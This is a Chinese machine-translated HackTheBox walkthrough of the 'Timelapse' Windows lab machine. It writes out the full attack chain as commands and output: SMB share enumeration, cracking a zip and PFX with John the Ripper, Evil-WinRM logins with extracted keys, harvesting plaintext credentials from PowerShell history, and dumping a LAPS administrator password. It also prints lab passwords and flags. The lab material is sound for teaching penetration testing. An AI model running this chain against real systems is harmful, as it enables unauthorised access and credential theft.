<html>
<head>
<title>Timelapse from HackTheBox — Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子的延时——详细演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/timelapse-from-hackthebox-detailed-walkthrough-5b36f5cde290?source=collection_archive---------3-----------------------#2022-08-22">https://infosecwriteups.com/timelapse-from-hackthebox-detailed-walkthrough-5b36f5cde290?source=collection_archive---------3-----------------------#2022-08-22</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="8dff" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">向您展示完成盒子所需的所有工具和技术。</h2></div><h1 id="64f0" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">机器信息</h1><figure class="ky kz la lb gt lc gh gi paragraph-image"><div class="gh gi kx"><img src="../Images/0c0155f1972193523aa017e3594da0ea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*8Br0Hr3t2dlJ47NU.png"/></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">黑客盒子的延时</figcaption></figure><p id="39cb" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">《延时》被评为HackTheBox上的简易机。这个Windows机器有许多开放的端口，但我们的时间主要花在SMB的445端口和WinRM的5986端口上。使用SMBClient，我们找到几个打开的共享，从那里我们检索一个备份文件。在破解了zip文件和其中的pfx文件之后，我们使用Evil-WinRM来获得一个远程连接。WinPEAS帮助我们找到一个带有凭据的文件。与新用户交换，我们为管理员转储一个LAPS密码，并完成这个框。</p><p id="7c3f" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">所需的技能主要是关于共享和Windows文件系统的枚举。学习的技能是转换和破解不同的文件类型，使用邪恶的WinRM和LAPS。</p><h1 id="9862" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">初步侦察</h1><p id="495c" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">像往常一样，让我们从Nmap开始:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi mk"><img src="../Images/94b36381509446bc83e25eb85f76eb02.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gh_JntZ_Fq9qVruUsCe3mQ.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">盒子的Nmap扫描</figcaption></figure><h1 id="f0c0" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">SMB客户端</h1><p id="67c6" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">这是一个打开了445端口的Windows盒子，让我们来看看共享:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="38c1" class="mu kg iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timelapse]<br/>└─# smbclient -L 10.10.11.152<br/>Enter WORKGROUP\roots password: <br/><br/>        Sharename       Type      Comment<br/>        ---------       ----      -------<br/>        ADMIN$          Disk      Remote Admin<br/>        C$              Disk      Default share<br/>        IPC$            IPC       Remote IPC<br/>        NETLOGON        Disk      Logon server share <br/>        Shares          Disk      <br/>        SYSVOL          Disk      Logon server share</span></pre><h1 id="b72e" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">SMBMap</h1><p id="fbca" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">我们可以看到一个开放的共享，您可以使用smbmap列出我们可以访问的所有内容，而不是手动查看:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi mz"><img src="../Images/f68340f5c6dd4e45133e94f86a8a0bb6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*H95bX6YsRtaDq5IWvCyksA.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">显示可访问文件列表的smbmap</figcaption></figure><p id="80ff" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">备份文件通常是一个很好的地方。让我们获取winrm zip文件:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="0de8" class="mu kg iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timelapse]<br/>└─# smbclient \\\\10.10.11.152\\Shares<br/>Enter WORKGROUP\roots password: <br/>smb: \&gt; cd Dev<br/>smb: \Dev\&gt; dir<br/>  winrm_backup.zip          A     2611  Mon Oct 25 16:46:42 2021<br/>            6367231 blocks of size 4096. 1076764 blocks available<br/><br/>smb: \Dev\&gt; get winrm_backup.zip<br/>getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip<br/>(0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)<br/>smb: \Dev\&gt; exit</span></pre><p id="c406" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">不幸的是，我们发现这是一个受密码保护的压缩文件:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="04fe" class="mu kg iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timelapse]<br/>└─# unzip winrm_backup.zip                               <br/>Archive:  winrm_backup.zip<br/>[winrm_backup.zip] legacyy_dev_auth.pfx password: <br/>password incorrect--reenter: <br/>password incorrect--reenter: <br/>   skipping: legacyy_dev_auth.pfx    incorrect password</span></pre><h1 id="53b2" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">zip文件哈希破解</h1><p id="7dd4" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">使用zip2john脚本创建一个我们可以尝试破解的哈希文件:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="a196" class="mu kg iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timelapse]<br/>└─# zip2john winrm_backup.zip &gt; winrm.hash<br/>ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8<br/><br/>┌──(root💀kali)-[~/htb/timelapse]<br/>└─# cat winrm.hash      <br/>winrm_backup.zip/legacyy_dev_auth.pfx:$pkzip$1*1*2*0*965*9fb*12ec568<br/>c88a3cec7243acf179b842f2d96414d306fd67f0bb6abd97366b7aaea736a0&lt;SNIP&gt;<br/>82727976b2243d1d9a4032d625b7e40325220b35bae73a3d11f4e82a4085f9&lt;SNIP&gt;<br/>7b7e506452f76*$/pkzip$:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip</span></pre><p id="4f20" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">现在我们可以试着用JohnTheRipper和rockyou单词表来破解:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="b831" class="mu kg iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timelapse]<br/>└─# john --wordlist=/usr/share/wordlists/rockyou.txt winrm.hash  <br/>Using default input encoding: UTF-8<br/>Loaded 1 password hash (PKZIP [32/64])<br/>Will run 4 OpenMP threads<br/>Press 'q' or Ctrl-C to abort, almost any other key for status<br/>supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     <br/>1g 0:00:00:03 DONE (2022-04-09 22:31) 0.2583g/s 897521p/s 897521c/s 897521C/s surkerior..superkebab<br/>Use the "--show" option to display all of the cracked passwords reliably<br/>Session completed.</span></pre><p id="68ef" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">只需要几秒钟就能得到密码。让我们解压文件，看看里面的内容:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="cc71" class="mu kg iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timelapse]<br/>└─# unzip winrm_backup.zip                                  <br/>Archive:  winrm_backup.zip<br/>[winrm_backup.zip] legacyy_dev_auth.pfx password: <br/>  inflating: legacyy_dev_auth.pfx</span></pre><h1 id="926a" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">PFX文件哈希破解</h1><p id="6837" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">我们有一份档案里的pfx文件。如果你以前没有使用过pfx文件，那么<a class="ae na" href="https://www.howtouselinux.com/post/pfx-file-with-examples" rel="noopener ugc nofollow" target="_blank">这个</a>是有帮助的。最后一节解释了如何从pfx文件中提取私钥。但是，如果我们尝试，我们会发现这也需要一个密码:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="65dd" class="mu kg iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timelapse]<br/>└─# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key<br/>Enter Import Password:<br/>Mac verify error: invalid password?</span></pre><p id="d419" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">让约翰来破解这个。首先将pfx文件转换成一个John友好的散列:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="7644" class="mu kg iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timelapse]<br/>└─# pfx2john legacyy_dev_auth.pfx &gt; pfx.hash<br/><br/>┌──(root💀kali)-[~/htb/timelapse]<br/>└─# cat pfx.hash<br/>legacyy_dev_auth.pfx:$pfxng$1$20$2000$20$eb755568327396de179c4a5d<br/>668ba8fe550ae18a$3082099c3082060f06092a864886f70d010701a082060004<br/>8205fc308205f8308205f4060b2a864886f70d010c0a0102a08204fe308&lt;SNIP&gt;<br/>23b99e245b03465a6ce0c974055e6dcc74f0e893:::::legacyy_dev_auth.pfx</span></pre><p id="f2c5" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">再次用rockyou点燃JohnTheRipper:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="6518" class="mu kg iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timelapse]<br/>└─# john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash      <br/>Using default input encoding: UTF-8<br/>Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])<br/>Cost 1 (iteration count) is 2000 for all loaded hashes<br/>Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes<br/>Will run 4 OpenMP threads<br/>Press 'q' or Ctrl-C to abort, almost any other key for status</span><span id="c8e8" class="mu kg iq mq b gy nb mw l mx my">thuglegacy       (legacyy_dev_auth.pfx)     </span><span id="ec1f" class="mu kg iq mq b gy nb mw l mx my">1g 0:00:00:42 DONE (2022-04-09 22:45) 0.02346g/s 75826p/s 75826c/s 75826C/s thuglife06..thsco04<br/>Session completed.</span></pre><p id="ca28" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">几秒钟后我们会有另一个密码。现在我们有了密码，让我们提取私钥:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="a1fb" class="mu kg iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timelapse]<br/>└─# openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv.key<br/>Enter Import Password:<br/>Enter PEM pass phrase:<br/>Verifying - Enter PEM pass phrase:</span></pre><p id="e457" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">对于PEM密码短语，您可以将其设置为任何值，我使用的是1234。</p><p id="1be5" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我们还需要证书和私钥。再次使用我们从John处获得的相同密码:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="eb6b" class="mu kg iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timelapse]<br/>└─# openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out pfx.crt<br/>Enter Import Password:</span></pre><h1 id="c636" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Evil-WinRM作为用户合法身份</h1><p id="dda6" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">现在我们有了使用Evil-WinRM连接所需的所有文件:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="558c" class="mu kg iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timelapse]<br/>└─# evil-winrm -i 10.10.11.152 -c ./pfx.crt -k ./priv.key -p -u -S <br/>Evil-WinRM shell v3.3<br/>Warning: SSL enabled<br/>Info: Establishing connection to remote endpoint<br/>Enter PEM pass phrase:<br/>*Evil-WinRM* PS C:\Users\legacyy\Documents&gt;</span></pre><h1 id="26c3" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">用户标志</h1><p id="5c2e" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">使用我们之前设置的PEM密码1234，我们现在连接上了。我先得到了用户标志:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="b9a3" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; type ..\desktop\user.txt<br/>e9fd75b313ffaa4e72f06e32dffc6f96</span></pre><h1 id="026d" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">WinPEAS</h1><p id="9495" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">然后我用<a class="ae na" href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS" rel="noopener ugc nofollow" target="_blank"> WinPEAS </a>寻找有趣的东西:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ml mm di mn bf mo"><div class="gh gi nc"><img src="../Images/b6e8251a12a5cb16baf2fe5a9edb2ba0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rvnnhUKNW32sgQC5Gphf1g.png"/></div></div><figcaption class="lf lg gj gh gi lh li bd b be z dk translated">下载最新版本的winPEAS</figcaption></figure><p id="4e3e" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">我们可以使用我们的连接会话来上传文件:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="49f4" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; upload /root/htb/timelapse/winPEAS.bat<br/>Info: Uploading /root/htb/timelapse/winPEAS.bat to C:\Users\legacyy\Documents\winPEAS.bat<br/>Enter PEM pass phrase:<br/>Data: 47688 bytes of 47688 bytes copied<br/>Info: Upload successful!</span></pre><p id="68a5" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">bat文件可以运行，但是输出有点混乱。尽管如此，翻阅一下我们还是发现了一些有趣的事情:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="f3a9" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; .\winPEAS.bat<br/><br/>&lt;SNIP&gt;<br/>HKEY_LOCAL_MACHINE\Software\Policies\Microsoft Services\AdmPwd<br/>    AdmPwdEnabled    REG_DWORD    0x1<br/>[i] Active if "1"<br/><br/>&lt;SNIP&gt;<br/>Checking PS history file<br/> Volume in drive C has no label.<br/> Volume Serial Number is 22CC-AE66<br/> Directory of C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine<br/>03/04/2022  12:46 AM               434 ConsoleHost_history.txt<br/>               1 File(s)            434 bytes<br/>               0 Dir(s)   6,101,368,832 bytes free</span></pre><p id="7569" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">ConsoleHost_history.txt文件包含我们所连接的用户运行的命令:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="9a0a" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><span id="d075" class="mu kg iq mq b gy nb mw l mx my">whoami<br/>ipconfig /all<br/>netstat -ano |select-string LIST<br/>$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck<br/>$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force<br/>$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)<br/>invoke-command -computername localhost -credential $c -port 5986 -usessl -<br/>SessionOption $so -scriptblock {whoami}<br/>get-aduser -filter * -properties *<br/>exit</span></pre><p id="8afc" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">正如<a class="ae na" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#tools" rel="noopener ugc nofollow" target="_blank"> PayloadsAllTheThings </a>备忘单上注明的，这是需要检查的众多文件之一。由此我们有了一个新用户svc_deploy和一个密码。我们还看到他们查看了AD中的所有用户，快速检查显示有不少用户:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="6257" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; get-aduser -filter * | select samaccountname<br/>Enter PEM pass phrase:<br/><br/>samaccountname<br/>--------------<br/>Administrator<br/>Guest<br/>krbtgt<br/>thecybergeek<br/>payl0ad<br/>legacyy<br/>sinfulz<br/>babywyrm<br/>svc_deploy<br/>TRX</span></pre><h1 id="4fc9" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">Evil-WinRM作为用户SVC_Deploy</h1><p id="29cb" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">作为当前用户，我不能做太多，让我们切换到我们找到的svc_deploy帐户:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="1f22" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users\legacyy\Documents&gt; exit<br/>Enter PEM pass phrase:<br/>Info: Exiting with code 0<br/><br/>┌──(root💀kali)-[~/htb/timelapse]<br/>└─# evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S<br/><br/>Evil-WinRM shell v3.3<br/>Warning: SSL enabled<br/>Info: Establishing connection to remote endpoint<br/>*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt;</span></pre><h1 id="04f2" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">膝</h1><p id="c436" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">我花了一段时间环顾四周，没有什么明显的跳出来。回头看看WinPEAS的输出，我们发现LAPS安装在注册表中。我们还看到，服务台开始时有LAPS安装文档和文件。然后这个盒子的名字就有意义了时间流逝！</p><p id="781b" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">LAPS管理本地管理员密码，以设定的频率轮换它。<a class="ae na" href="https://www.recastsoftware.com/resources/overview-of-microsoft-laps-local-administrator-password-solution/" rel="noopener ugc nofollow" target="_blank">这个</a>是所有事物圈的向导。我还发现<a class="ae na" href="https://smarthomepursuits.com/export-laps-passwords-powershell/" rel="noopener ugc nofollow" target="_blank">这个</a>很有帮助，从那以后我就把广告里的圈数密码给转走了:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="20c0" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; get-adcomputer -filter * -properties ms-mcs-admpwd | select name,ms-mcs-admpwd<br/><br/>name  ms-mcs-admpwd<br/>----  -------------<br/>DC01  1;s(T[,8/k6k8+n1e8Jh+Q@r<br/>DB01<br/>WEB01<br/>DEV01</span></pre><p id="bd60" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">检查我们在哪个服务器上，我们发现它是DC01:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="54e0" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users\svc_deploy\Documents&gt; hostname<br/>dc01</span></pre><h1 id="28f2" class="kf kg iq bd kh ki kj kk kl km kn ko kp jw kq jx kr jz ks ka kt kc ku kd kv kw bi translated">根标志</h1><p id="751d" class="pw-post-body-paragraph lj lk iq ll b lm mf jr lo lp mg ju lr ls mh lu lv lw mi ly lz ma mj mc md me ij bi translated">我们有本地管理员密码，我们知道我们在与之相关的DC01箱上。让我们跳出这个外壳，以管理员身份连接:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="3580" class="mu kg iq mq b gy mv mw l mx my">┌──(root💀kali)-[~/htb/timelapse]<br/>└─# evil-winrm -i 10.10.11.152 -u Administrator -p '1;s(T[,8/k6k8+n1e8Jh+Q@r' -S       <br/><br/>Evil-WinRM shell v3.3<br/>Warning: SSL enabled<br/>Info: Establishing connection to remote endpoint<br/>*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span></pre><p id="5871" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">让我们抓住根旗来完成这个盒子:</p><pre class="ky kz la lb gt mp mq mr ms aw mt bi"><span id="c078" class="mu kg iq mq b gy mv mw l mx my">*Evil-WinRM* PS C:\Users&gt; type trx\desktop\root.txt<br/>3b0e8ff4e0ba0e044abaf52dd07d342d</span></pre><p id="6ee3" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">完成了。下次见。</p></div><div class="ab cl nd ne hu nf" role="separator"><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni"/></div><div class="ij ik il im in"><p id="56b5" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">如果你喜欢这篇文章，请给我一两个掌声(这是免费的！)</p><p id="af85" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated">推特—<a class="ae na" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae na" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="37e2" class="pw-post-body-paragraph lj lk iq ll b lm ln jr lo lp lq ju lr ls lt lu lv lw lx ly lz ma mb mc md me ij bi translated"><em class="nk">原载于2022年8月22日</em><a class="ae na" href="https://pencer.io/ctf/ctf-htb-timelapse/" rel="noopener ugc nofollow" target="_blank"><em class="nk">https://pencer . io</em></a><em class="nk">。</em></p></div><div class="ab cl nd ne hu nf" role="separator"><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni nj"/><span class="ng bw bk nh ni"/></div><div class="ij ik il im in"><h2 id="d546" class="mu kg iq bd kh nl nm dn kl nn no dp kp ls np nq kr lw nr ns kt ma nt nu kv nv bi translated">来自Infosec的报道:Infosec每天都有很多内容，很难跟上。<a class="ae na" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank">加入我们的每周简讯</a>以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</h2></div></div>    
</body>
</html>